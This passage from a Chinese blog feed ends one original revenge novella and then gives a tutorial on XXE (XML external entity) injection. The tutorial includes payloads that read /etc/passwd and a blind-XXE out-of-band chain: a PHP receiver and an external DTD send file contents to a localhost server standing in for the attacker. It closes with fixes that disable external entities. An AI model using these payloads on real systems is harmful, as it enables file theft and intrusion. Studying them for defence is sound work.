<h3 id="4-0］"><a href="#4-0］" class="headerlink" title="[4.0］"></a>[4.0］</h3><p>　　高老爷的死，是林枫急急忙忙告诉我的。据林枫说，高老爷是被人用利器直插心脏，一命呜呼的。官府为了找出元凶，在城内贴出皇榜，虽说凶手蒙着面，但高老爷的家丁看见了凶手手臂上刻着刺青。<br>　　林枫硬拉着我，挤进皇榜前的人群。只见皇榜上的通缉犯蒙着黑纱，而在他的左手手臂上鲜明地刻着莲花刺青。此时，我的脑海中首先浮现出的是月姬，于是连忙挤出人群，跑回酒馆。奔跑间，远远地望见，军队包围了我们的酒馆，而月姬被上了手铐脚镣，押进了囚笼。我愤怒地奔跑着，伸手想要亮出弯刀，却被藏在角落的梅生死死地挡住。<br>　　兵头询问着月姬，“凶手手臂的刺青与你手臂上的无异，你可认罪？”。月姬摸了摸手臂上的莲花刺青，大笑道：“没错，我就是凶手，是我杀死高老爷的，与任何人无关！”。望着囚笼里远去的月姬，我痛彻心扉。<br>　　数月前，月姬知道我手臂上的莲花刺青后，便托付终身。而今，她为了我甘愿牺牲性命。我极力挣脱了梅生，死命地奔向月姬，迎面而来的却只有滚滚的烟尘，以及月姬远去的背影。<br>　　林家堡内，林枫、梅生与我围坐一地，商讨着劫狱大计。我们的计划是，以梅生为诱饵，引开监牢外的守军，然后由我潜进监牢救出月姬，林枫则负责出现意外时的救援，以及救援成功后接头我们逃离风莲国。<br>次日深夜，一行黑影隐匿于监牢外的竹林。我抬头仰望着夜空，眼看着即将乌云盖月，随即示意梅生行动开始。梅生终身一跃，脚尖轻弹于竹林之上，踏着竹叶，迎着黑风，翻身至监牢之外。<br>　　牢外的守军，纷纷前去追赶，梅生凭借着超凡的轻功，轻松翱翔于守军头颅之上，向竹林深处飞去。望着远去的守军，我赶忙飞身至监牢大门外。放眼监牢内，灯火通明，却异常的安静。脑海浮现出月姬的身影，我奋不顾身地步入监牢，四处寻找着月姬。然而，我所到之处，全都是空无一人。而在此时，门外传来密集的脚步声，我深知中计，便纵身飞向头顶的天窗，不料一张大网从天而降，重重地把我压倒在地。透过绳网，传来阵阵冷笑。随后，我被押进了囚笼，前往秘密监牢，而埋伏于竹林的救援队迟迟没有行动。<br>　　次日，我被五花大捆地押进位于地底的秘密监牢。牢笼里的月姬，哭喊着我的名字，泪已流干。狱头狠狠地把我揣进牢笼，望着眼前满身是伤的月姬，我心如刀绞。我轻拂着月姬的脸颊，将其拥于怀中，用手一遍遍地梳理着她的乱发。月姬像是一只受惊的小猫，死死地抱着我，空洞的眼神中透露着绝望。<br>　　紧紧地搂着月姬，我微笑着，即使面对死亡，我也有月姬相伴，死而无憾了。只可惜，今生无法再与梅生相见，也不知他身在何处？</p>
<h3 id="5-0］"><a href="#5-0］" class="headerlink" title="[5.0］"></a>[5.0］</h3><p>　　再见到林枫是几天后的事了。<br>　　凭借着林家堡的势力，林枫轻而易举地来到了秘密监牢。牢门缓缓开启，随着清脆的脚步声，迎面而来的是一席黑影。翻起头顶的黑帽后，一张俊秀的脸庞显露无疑。然而，此时林枫的脸上却显得异常的阴沉。他叹了口气，沉重地说道：“刺兄，看来是梅生想陷害你啊！”。<br>　　没等我回过神来，林枫就向我讲诉了劫狱当晚的情景。他说，那晚我进入监牢后，林枫便一直在暗处保护我，没想到梅生走后没多久便带着大批军队冲进了监牢，林枫深知中了梅生的套，便逃离了现场，准备日后再伺机营救。<br>　　凭借着与梅生朝夕相处二十几年的关系，我自然不会相信林枫的鬼话。至于，事实是否如林枫所诉，我不得而知，只是内心那份对梅生的兄弟情义告知我，不能怀疑他，即使世上只有我们三人手臂拥有莲花刺青，即使梅生迟迟没有露面。<br>　　林枫走后，他口中诉说的场景夜夜出现在我的梦中。梅生手持长剑，抵在我的脖颈，随即传来阵阵冷笑，冰冷刺骨。每个望不见星空的夜晚，我都被相同的梦境折磨着，梅生成了我逃不出梦魇。<br>　　林枫隔三岔五地到访监牢，每次都会带来梅生的情况。据他所说，梅生自从离开监牢后，便回到了家中。眼看着行刑期越来越近，我显得焦虑不安。相同的梦境，时时刻刻浮动在我的脑海中。林枫看出了我的焦虑，心生一计，凭借着他的势力，偷龙转凤也并不算难。在我们秘密相商后，林枫甘愿暂时代替我深陷牢笼，待我出去寻得梅生，把此事问清楚后，再换回林枫。<br>　　出发前，林枫无比坚信地望着我，默默地点点头，眼神不再是初次见面时的不屑，而是充满着信任与期许。<br>　　踏出监牢的大门，我飞身跃向半空，调动着全身的真气，踏着片片屋瓦飞向远方。<br>　　落地家门前的清溪岸，记忆如潮水般涌入大脑。那些年，梅生装睡的神情，梅生气得破口大骂的囧样，都历历在目。推开老旧的木门，随着咯吱的声响，阳光汇聚成一道光线，透着门缝照入屋内。梅生静坐堂前，紧闭的双目缓缓睁开，脸上不再是以往的春光，而是略显忧伤。<br>　　梅生摆了摆手，示意我坐在身旁，面对着眼前熟悉而陌生的梅哥，我乱了心神。望着我，梅生眼神中带着几分欣慰，说；“阿青，你能安然无恙的回来，我就放心了！”随即转眼定睛于远方，眼神中满是忧伤。<br>沉默片刻，梅生冷冷地笑着，只是脸上僵硬得面无表情，说：“你什么都不用问了，一切都是我干的，是我对不住你。答应我，一定要好好活着！”。说话间，梅生拿出了早已藏于怀中的匕首，狠狠地刺向了自己的心门，血流了一地。<br>　　我扶起倒地的梅生，望着他空洞的眼神中透露出来的悲伤，泪水溢满了眼眶。紧紧地抱着奄奄一息的他，我发了疯似地喊着，“为什么，这究竟是为什么？”。梅生贴着我的耳朵，死命地重复说着：“弟弟，快走！”。<br>　　随后，我便明白了梅生的意思。随着一阵阵脚步声，屋外集结了大批的军队，把老屋围得严严实实。 </p>
<h3 id="6-0］"><a href="#6-0］" class="headerlink" title="[6.0］"></a>[6.0］</h3><p>　　天光照在清溪上，水面闪显出层层白光，倒映出溪岸边的重重杀机。<br>　　拉开木门，迎着刺眼阳光下的是一层盔甲反射出的白色光芒。勉强地眯拢着双眼，待适应强光后，眼前渐渐清晰。前后几排的长弓兵，身披白皑皑的盔甲，手持长弓，伺机待发。随着一声号令，无数的弓箭从天而降，密如细雨，直直的射向屋内。<br>　　千钧一发之际，我迅速关闭了木门，向后连翻数次，只见弓箭从我身边唰唰直下。我搬起一张木桌，挡在身前，随着掩护慢慢靠近梅生的尸体。木桌下，我抱起梅生，听着屋外被箭射穿的声音，似乎看到了地狱的大门。<br>　　以往，每当走到生死关头，梅生都会奋不顾身地出现，而今，一切都不复存在了。片刻后，屋外停止了响动。我依附着地面，爬到窗前，透过被箭射穿的洞口望向屋外，成排的长弓兵装填着弓箭，手中握着火把。<br>　　随着一阵熟悉而陌生的冷笑，从人群中走出一个身影。透过窗户，清楚的看见身影的轮廓，包括那双不屑的眼神。林枫慢慢接近老屋，随即推开了木门。盯着踏入屋内的林枫，我眼神中透出绝望。林枫向我瞥了瞥眼，露出不屑的眼神，如同几年前的初次相遇，冷冷地说：“刺兄，可安好啊”，随即放声大笑。<br>　　我抹搽着眼角的泪水，淡淡地说道：“我早该想到是你”。林枫走向躺着的梅生，疯狂地踩踏着他的尸体，眼神中满是愤恨。我随即拿出腰间的弯刀，狠狠地刺向林枫。林枫回过神来，脚尖轻轻一弹，轻松躲开了我的刀锋。眼见扑了个空，我全力调动真气于刀尖，砍向林枫。然而，林枫的轻功远非我能及，数次进攻都被他轻松躲过。不知不觉中，他已绕到我的脑后，瞬间一把利刃穿胸而过，流淌出鲜血。随之而来的是一真呐喊，不要！月姬含着泪水，奔向屋内，眼看着就要接近倒地的我，却被林枫拦下。<br>　　“月妹，今天是我们报仇的大好日子，哭哭啼啼的像什么样子”林枫指着我对月姬说道：“怎么，心疼了？”。月姬带着哭腔说道：“哥，你答应过我不杀他的”。林枫吼叫着，“对仇家不可存仁慈之心，就像当年他们没有杀死我们，而今，我们得以报仇雪恨，对敌人的仁慈就是对自己的残忍。”说话间，林枫瞪大着双眼，死死地盯着我。<br>　　我冷笑着，干涩的眼睛已流干了泪，绝望地看着眼睛两位曾经的至亲至爱，说：“好！原来你们隐瞒了这么多秘密，原来这一切都只是你复仇的计划。如今，我也已是快死之人，有什么秘密都说出来吧，至少让我死得瞑目。”<br>　　林枫解开上衣，露出了手臂，那朵散发着青光的莲花清晰可见。他说，我们都属于青莲族人，手臂上的刺青是我们的族标。我们的族人，从前生活在遥远的北都，远离中土的纷扰。然而，直到一场瘟疫的爆发，使得族人死伤无数，最后只剩两大家族逃离出来，从此定居在了风莲国。而这两大家族，便是秋梅两家。梅生是我的亲兄弟，月姬则是林枫的亲妹妹。自从定居风莲国后，日子便一天天好转。可没曾想，一天夜里秋家突发大火，秋家人除了死里逃生的林枫与月姬，其余全都葬身火海。逃生后的林枫一口咬定，我的父母就是纵火的元凶，从此便对梅家积下了深仇大恨。<br>　　月姬紧紧地捂住耳朵，眼中不住的流泪。为了保住刺青的性命，月姬不惜牲牲良知帮助林枫，可她没想到，林枫的复仇计划中，从来就没有道义与守信。林枫说，劫狱当晚，逃离后的梅生望着冲入监牢的守兵，奋不顾身的折返营救，不料途中中了林枫早已布好的陷阱。然而，当梅生知道林枫的身份后，苦苦祈求林枫放过我，自己甘愿扛下所有的罪过，包括多年前秋家的那场火灾。就这样，林枫借着对我骗取的信任，借着梅生对我的愧疚，毫不留情地展开了他的复仇计划。而月姬只是整盘复仇计划中的一枚棋子，也是整个计划的开始。林枫放声大笑道，“那场大火之后不久，你们梅家便一年接一年的死人，真是报应啊。直到只剩下你俩，你哥便隐姓埋名，远离故居。时间能改变你们的名字，改变你们的容貌，却永远改变不了你们手臂上的刺青”。<br>　　我不解道，“你们怎么知道我手臂上的刺青？”。林枫望着月姬笑道，“月姬手臂上的莲花刺青显露于世人，本就是为了找出你们所安排的。平常人看了此刺青，定会心生好奇，而数月来我一直在暗中观察，只有你不为所动。原因只有一个，就是你也拥有莲花刺青”。<br>　　我仰天大笑着，直至嘴角流出鲜血，我强撑着最后一口气，望着神情恍惚的月姬，说：“你爱过我吗？”。<br>　　月姬沉默着，闭上眼的最后一刻，我望见月姬举起了匕首。…… </p>
<h3 id="7-0］"><a href="#7-0］" class="headerlink" title="[7.0］"></a>[7.0］</h3><p>　　匕首深深地插入月姬的心胸，鲜血从胸口流向地面，从地面流向刺青倒下的身躯。<br>　　林枫抱着奄奄一息的月姬，痛苦不已。从出生到现在，林枫唯一一次流下了眼泪，即使当年眼看着家人葬身火海，林枫愣是一点泪也没流。<br>　　月姬仰起头，凑着林枫的耳朵，断断续续地说，“哥……我觉得好轻松……我走后……你要……要好好照顾……自己”。林枫抱着断气的月姬怒吼着，响声震彻山谷。<br>　　林枫抱着月姬走出老屋，随即箭雨伴随着火焰，射向屋内，顿时一片火海。黑云压近，凡世间的尘埃浮浮滚滚，汇聚湿润的黑云，酝酿着一场暴雨。磅礴的雨滴敲打着大地，淋湿了早已脆弱不堪的心，几十年间的尘埃，随着滚滚而去的雨水，流淌在大地之上，消散于光阴之中。<br>　　林枫坐立悬崖边，抚摸着怀中的月姬，仰天承受着上天的洗礼。磅礴的大雨，落在林枫的发间，眉间，如织的记忆伴随着雨水，流淌进他的心里，尘封的往事渐渐清晰。<br>　　二十年前，秋家大院内，四个孩子嬉笑着。秋老爷在一旁看得乐在其中，随即设宴款待梅家两位公子。宴席间，秋老爷拿出一本武功秘籍赠与两位公子，并嘱咐要好生研习。年少的秋枫身为秋家大公子，曾多次恳求秋老爷教授武功，却屡屡遭到打骂。要说天赋，秋枫是四人中最好的，然而，在秋老爷心中，秋枫戾气太重，并不适合练武，因此始终没有传授秋枫武功。长此以往，年少的秋枫心中横生恨意，便在一个夜深人静的晚上偷出了家传的武功秘籍，不料却被秋老爷发现。惜子的秋老爷不忍下重手，秋枫则趁机暗施黑手，杀害了秋老爷。为了毁尸灭迹，秋枫纵火烧了秋老爷的房间。谁知火势瞬间就无法控制，四处蔓延至整幢大宅，秋枫见状赶忙叫醒了睡梦中的秋月，逃离了火海。因为对梅家两位公子的嫉恨，秋枫便把纵火的元凶推给梅家。<br>　　逃离后的秋枫幸得林家堡收留，改姓为林，而为了防止秋月道出整个事件的始末，便将她卖入了云烟楼，艺名月姬。自此以后，秋枫便不断雇凶杀害梅家人，直到只剩下梅家两位公子神秘失踪。<br>　　随着时间的推移，林枫对父母对妹妹的负罪感渐渐消失，反之剧增的便是对梅家的仇恨。甚至，在他脑中的那段记忆已经变形，那个纵火烧死自己家人，将自己妹妹卖入云烟楼的不再是自己，而是梅家人。<br>　　时光荏苒，仇恨在林枫心中越演越烈，直到他得知了梅家两位公子的下落，复仇计划就在他心中生根发芽。月黑风高的夜晚，他身穿黑衣潜入高府宅院，杀害高老爷后，撕下袖子，在月光下露出散发着青光的莲花刺青。<br>　　月姬被捕后，利用刺青对她的爱，一步步地把他与梅生引入圈套。最后，只需凭借着自己骗取的信任，挑拨梅家两兄弟的关系，使两人互相残杀，而自己坐收渔翁之利，让他们如同当年的秋家人，葬身火海。<br>　　然而，无论他的计划多周密，月姬对刺青的真情是他无法控制的。而在月姬心中，自己不顾一切地帮助着林枫，只是为了保护自己深爱的刺青。也为了自己唯一的亲人能早日回头，月姬一直隐瞒着当年的那段尘封往事。可她不明白，那个曾经救自己出火场的秋枫早已葬身火海，而后的林枫只不过是一具被仇恨包裹着的行尸走肉。<br>　　躯壳下的灵魂早已不在，不变的只是手臂上散发着青光的莲花刺青，刻下了凄美的伤疤，无法抹去，深入骨髓。</p>
<h3 id="8-0］"><a href="#8-0］" class="headerlink" title="[8.0］"></a>[8.0］</h3><p>　　尘封的往事渐渐清晰，而林枫的心却渐渐迷茫，自己多年筹划的复仇计划，自己设身处地想置于死地的梅家，只不过是自己为当年罪行找的替罪羊。<br>　　大雨冲刷着大地，尘埃流失后露出那个找寻多年的凶手竟是自己，林枫痛哭流涕，紧抱着月姬，悲痛的哭喊着，夹杂着暴雨声，久久回荡在尘世。 </p>
<h3 id="9-0］"><a href="#9-0］" class="headerlink" title="[9.0］"></a>[9.0］</h3><p>　　伴随着雨滴，林枫抱起月姬，纵身跃入了万丈悬崖。……</p>
<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>　　这是一篇故事相对比较苍白的小说，文风也比较小白，现在读起来感觉很多情节不够合理，但本篇的题材是我偏爱的那种。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;用刺青，刻下凄美的伤疤，无法抹去，深入骨髓&lt;/blockquote&gt;&lt;br&gt;　　怀旧原创小说三部曲，这是最后一篇了，相信我，发完这篇我不会再发小说，是时候该好好研究研究技术了，不能整天不务正业。&lt;br&gt;
    
    </summary>
    
      <category term="诗意年华" scheme="http://thief.one/categories/%E8%AF%97%E6%84%8F%E5%B9%B4%E5%8D%8E/"/>
    
    
      <category term="原创小说" scheme="http://thief.one/tags/%E5%8E%9F%E5%88%9B%E5%B0%8F%E8%AF%B4/"/>
    
  </entry>
  
  <entry>
    <title>浅谈XXE漏洞攻击与防御</title>
    <link href="http://thief.one/2017/06/20/1/"/>
    <id>http://thief.one/2017/06/20/1/</id>
    <published>2017-06-20T02:54:08.000Z</published>
    <updated>2017-07-25T12:05:00.000Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">你会挽着我的衣袖，我会把手揣进裤兜</blockquote><br>　　之前在参加一场CTF竞赛中遇到了xxe漏洞，由于当时并没有研究过此漏洞，解题毫无头绪。为了弥补web安全防御知识以及减少漏洞利用短板，我翻阅了一些关于xxe漏洞的资料，学习后在此总结分享。<br><a id="more"></a></p>
<h3 id="XML基础"><a href="#XML基础" class="headerlink" title="XML基础"></a>XML基础</h3><p>在介绍xxe漏洞前，先学习温顾一下XML的基础知识。XML被设计为传输和存储数据，其焦点是数据的内容，其把数据从HTML分离，是独立于软件和硬件的信息传输工具。</p>
<h4 id="XML文档结构"><a href="#XML文档结构" class="headerlink" title="XML文档结构"></a>XML文档结构</h4><p>XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">&lt;!--XML申明--&gt;</div><div class="line">&lt;?xml version=<span class="string">"1.0"</span>?&gt; </div><div class="line"></div><div class="line">&lt;!--文档类型定义--&gt;</div><div class="line">&lt;!DOCTYPE note [  &lt;!--定义此文档是 note 类型的文档--&gt;</div><div class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;  &lt;!--定义note元素有四个元素--&gt;</div><div class="line">&lt;!ELEMENT to (<span class="comment">#PCDATA)&gt;     &lt;!--定义to元素为”#PCDATA”类型--&gt;</span></div><div class="line">&lt;!ELEMENT from (<span class="comment">#PCDATA)&gt;   &lt;!--定义from元素为”#PCDATA”类型--&gt;</span></div><div class="line">&lt;!ELEMENT head (<span class="comment">#PCDATA)&gt;   &lt;!--定义head元素为”#PCDATA”类型--&gt;</span></div><div class="line">&lt;!ELEMENT body (<span class="comment">#PCDATA)&gt;   &lt;!--定义body元素为”#PCDATA”类型--&gt;</span></div><div class="line">]]]&gt;</div><div class="line"></div><div class="line">&lt;!--文档元素--&gt;</div><div class="line">&lt;note&gt;</div><div class="line">&lt;to&gt;Dave&lt;/to&gt;</div><div class="line">&lt;from&gt;Tom&lt;/from&gt;</div><div class="line">&lt;head&gt;Reminder&lt;/head&gt;</div><div class="line">&lt;body&gt;You are a good man&lt;/body&gt;</div><div class="line">&lt;/note&gt;</div></pre></td></tr></table></figure></p>
<p>由于xxe漏洞与DTD文档相关，因此重点介绍DTD的概念。</p>
<h4 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h4><p>文档类型定义（DTD）可定义合法的XML文档构建模块，它使用一系列合法的元素来定义文档的结构。DTD 可被成行地声明于XML文档中（内部引用），也可作为一个外部引用。<br>内部声明DTD:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE 根元素 [元素声明]&gt;</div></pre></td></tr></table></figure></p>
<p>引用外部DTD:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE 根元素 SYSTEM <span class="string">"文件名"</span>&gt;</div></pre></td></tr></table></figure></p>
<p>DTD文档中有很多重要的关键字如下：</p>
<ul>
<li>DOCTYPE（DTD的声明）</li>
<li>ENTITY（实体的声明）</li>
<li>SYSTEM、PUBLIC（外部资源申请）</li>
</ul>
<h4 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h4><p>实体可以理解为变量，其必须在DTD中定义申明，可以在文档中的其他位置引用该变量的值。<br>实体按类型主要分为以下四种：</p>
<ul>
<li>内置实体 (Built-in entities)</li>
<li>字符实体 (Character entities)</li>
<li>通用实体 (General entities)</li>
<li>参数实体 (Parameter entities)</li>
</ul>
<p>实体根据引用方式，还可分为内部实体与外部实体，看看这些实体的申明方式。<br>完整的实体类别可参考 <a href="https://www.tutorialspoint.com/dtd/dtd_entities.htm" target="_blank" rel="external">DTD - Entities</a></p>
<h4 id="实体类别介绍"><a href="#实体类别介绍" class="headerlink" title="实体类别介绍"></a>实体类别介绍</h4><p>参数实体用%实体名称申明，引用时也用%实体名称;其余实体直接用实体名称申明，引用时用&amp;实体名称。<br>参数实体只能在DTD中申明，DTD中引用；其余实体只能在DTD中申明，可在xml文档中引用。</p>
<p>内部实体：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY 实体名称 <span class="string">"实体的值"</span>&gt;</div></pre></td></tr></table></figure></p>
<p>外部实体:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY 实体名称 SYSTEM <span class="string">"URI"</span>&gt;</div></pre></td></tr></table></figure></p>
<p>参数实体：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY % 实体名称 <span class="string">"实体的值"</span>&gt;</div><div class="line">或者</div><div class="line">&lt;!ENTITY % 实体名称 SYSTEM <span class="string">"URI"</span>&gt;</div></pre></td></tr></table></figure></p>
<p>实例演示：除参数实体外实体+内部实体<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span>?&gt;</div><div class="line">&lt;!DOCTYPE a [</div><div class="line">    &lt;!ENTITY name <span class="string">"nMask"</span>&gt;]&gt;</div><div class="line">&lt;foo&gt;</div><div class="line">        &lt;value&gt;&amp;name;&lt;/value&gt; </div><div class="line">&lt;/foo&gt;</div></pre></td></tr></table></figure></p>
<p>实例演示：参数实体+外部实体<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span>?&gt;</div><div class="line">&lt;!DOCTYPE a [</div><div class="line">    &lt;!ENTITY % name SYSTEM <span class="string">"file:///etc/passwd"</span>&gt;</div><div class="line">    %name;</div><div class="line">]&gt;</div></pre></td></tr></table></figure></p>
<p>注意：%name（参数实体）是在DTD中被引用的，而&amp;name（其余实体）是在xml文档中被引用的。</p>
<p>由于xxe漏洞主要是利用了DTD引用外部实体导致的漏洞，那么重点看下能引用哪些类型的外部实体。</p>
<h4 id="外部实体"><a href="#外部实体" class="headerlink" title="外部实体"></a>外部实体</h4><p>外部实体即在DTD中使用<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY 实体名称 SYSTEM <span class="string">"URI"</span>&gt;</div></pre></td></tr></table></figure></p>
<p>语法引用外部的实体，而非内部实体，那么URL中能写哪些类型的外部实体呢？<br>主要的有file、http、https、ftp等等，当然不同的程序支持的不一样：<br><img src="/upload_image/20170620/1.png" alt=""><br>实例演示：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span>?&gt;</div><div class="line">&lt;!DOCTYPE a [</div><div class="line">    &lt;!ENTITY content SYSTEM <span class="string">"file:///etc/passwd"</span>&gt;]&gt;</div><div class="line">&lt;foo&gt;</div><div class="line">        &lt;value&gt;&amp;content;&lt;/value&gt; </div><div class="line">&lt;/foo&gt;</div></pre></td></tr></table></figure></p>
<h3 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h3><p>XXE漏洞全称XML External Entity Injection即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。xxe漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。</p>
<h4 id="xxe漏洞检测"><a href="#xxe漏洞检测" class="headerlink" title="xxe漏洞检测"></a>xxe漏洞检测</h4><p>第一步检测XML是否会被成功解析：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span>?&gt;  </div><div class="line">&lt;!DOCTYPE ANY [  </div><div class="line">&lt;!ENTITY name <span class="string">"my name is nMask"</span>&gt;]&gt;    </div><div class="line">&lt;root&gt;&amp;name;&lt;/root&gt;</div></pre></td></tr></table></figure></p>
<p>如果页面输出了my name is nMask，说明xml文件可以被解析。<br><img src="/upload_image/20170620/2.png" alt=""></p>
<p>第二步检测服务器是否支持DTD引用外部实体：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=”1.0” encoding=”UTF-8”?&gt;  </div><div class="line">&lt;!DOCTYPE ANY [  </div><div class="line">&lt;!ENTITY % name SYSTEM <span class="string">"http://localhost/index.html"</span>&gt;  </div><div class="line">%name;  </div><div class="line">]&gt;</div></pre></td></tr></table></figure></p>
<p>可通过查看自己服务器上的日志来判断，看目标服务器是否向你的服务器发了一条请求test.xml的请求。<br><img src="/upload_image/20170620/3.png" alt=""><br>如果支持引用外部实体，那么很有可能是存在xxe漏洞的。</p>
<h4 id="xxe漏洞利用"><a href="#xxe漏洞利用" class="headerlink" title="xxe漏洞利用"></a>xxe漏洞利用</h4><p>xxe漏洞的危害有很多，比如可以文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等，这里就读取任意文件的利用方式进行测试。</p>
<h5 id="读取任意文件"><a href="#读取任意文件" class="headerlink" title="读取任意文件"></a>读取任意文件</h5><p>由于我是在windows上做的测试，因此让其读取c盘下的test.txt文件内容。<br><img src="/upload_image/20170620/4.png" alt=""><br>如果是linux下，可以读取/etc/passwd等目录下敏感数据。</p>
<p>以上任意文件读取能够成功，除了DTD可有引用外部实体外，还取决于有输出信息，即有回显。那么如果程序没有回显的情况下，该怎么读取文件内容呢？需要使用blind xxe漏洞去利用。</p>
<h5 id="blind-xxe漏洞"><a href="#blind-xxe漏洞" class="headerlink" title="blind xxe漏洞"></a>blind xxe漏洞</h5><p>对于传统的XXE来说，要求攻击者只有在服务器有回显或者报错的基础上才能使用XXE漏洞来读取服务器端文件，如果没有回显则可以使用Blind XXE漏洞来构建一条带外信道提取数据。</p>
<p>创建test.php写入以下内容：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line">file_put_contents(<span class="string">"test.txt"</span>, <span class="variable">$_GET</span>[<span class="string">'file'</span>]) ;  </div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>创建index.php写入以下内容：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line"><span class="variable">$xml</span>=&lt;&lt;&lt;EOF  </div><div class="line">&lt;?xml version=<span class="string">"1.0"</span>?&gt;  </div><div class="line">&lt;!DOCTYPE ANY[  </div><div class="line">&lt;!ENTITY % file SYSTEM <span class="string">"file:///C:/test.txt"</span>&gt;  </div><div class="line">&lt;!ENTITY % remote SYSTEM <span class="string">"http://localhost/test.xml"</span>&gt;  </div><div class="line">%remote;</div><div class="line">%all;</div><div class="line">%send;  </div><div class="line">]&gt;  </div><div class="line">EOF;  </div><div class="line"><span class="variable">$data</span> = simplexml_load_string(<span class="variable">$xml</span>) ;  </div><div class="line"><span class="built_in">echo</span> <span class="string">"&lt;pre&gt;"</span> ;  </div><div class="line">print_r(<span class="variable">$data</span>) ;  </div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>创建test.xml并写入以下内容：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">[html] view plain copy</div><div class="line">&lt;!ENTITY % all <span class="string">"&lt;!ENTITY % send SYSTEM 'http://localhost/test.php?file=%file;'&gt;"</span>&gt;</div></pre></td></tr></table></figure></p>
<p>当访问<a href="http://localhost/index.php" target="_blank" rel="external">http://localhost/index.php</a>, 存在漏洞的服务器会读出text.txt内容，发送给攻击者服务器上的test.php，然后把读取的数据保存到本地的test.txt中。</p>
<p><em>注：xxe的利用姿势以及绕过防御姿势有很多，这里不再一一介绍啦</em></p>
<h4 id="xxe漏洞修复与防御"><a href="#xxe漏洞修复与防御" class="headerlink" title="xxe漏洞修复与防御"></a>xxe漏洞修复与防御</h4><h5 id="使用开发语言提供的禁用外部实体的方法"><a href="#使用开发语言提供的禁用外部实体的方法" class="headerlink" title="使用开发语言提供的禁用外部实体的方法"></a>使用开发语言提供的禁用外部实体的方法</h5><p>PHP：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">libxml_disable_entity_loader(<span class="literal">true</span>);</div></pre></td></tr></table></figure></p>
<p>JAVA:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();</div><div class="line">dbf.setExpandEntityReferences(<span class="literal">false</span>);</div></pre></td></tr></table></figure></p>
